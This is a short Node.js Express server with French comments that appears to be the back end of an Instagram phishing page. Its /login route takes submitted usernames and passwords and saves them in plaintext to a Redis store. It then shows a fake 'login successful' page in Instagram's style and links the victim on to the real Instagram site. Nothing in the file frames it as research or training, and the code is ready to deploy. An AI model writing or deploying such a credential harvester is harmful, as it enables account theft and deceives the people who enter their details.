const express = require('express');
const { Redis } = require('@upstash/redis');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Initialisation du client Redis avec les variables d'environnement
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

// Middleware pour lire les données du formulaire
app.use(express.urlencoded({ extended: true }));
// Middleware pour servir les fichiers statiques (ton index.html et les images)
app.use(express.static(__dirname));

// La route qui traite la soumission du formulaire
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // 1. Enregistrer les identifiants dans Redis
    const logKey = `log:${Date.now()}`;
    const logData = {
        username: username,
        password: password,
        date: new Date().toISOString()
    };

    try {
        await redis.hset(logKey, logData);
        console.log(`Identifiants sauvegardés dans Redis avec la clé: ${logKey}`);
    } catch (error) {
        console.error('Erreur lors de la sauvegarde dans Redis:', error);
    }

    // 2. Envoyer une page de confirmation au lieu de rediriger
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Connexion</title>
            <style>
                body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; }
                .message-box { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
                h1 { color: #262626; }
                p { color: #8e8e8e; }
                a { color: #0095f6; text-decoration: none; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="message-box">
                <h1>Connexion réussie</h1>
                <p>Vos informations ont été envoyées avec succès.</p>
                <p><a href="https://www.instagram.com">Cliquez ici pour continuer vers Instagram</a></p>
            </div>
        </body>
        </html>
    `);
});

// Route pour la page d'accueil (sert ton fichier index.html)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Démarrage du serveur
app.listen(port, () => {
    console.log(`Serveur démarré sur http://localhost:${port}`);
});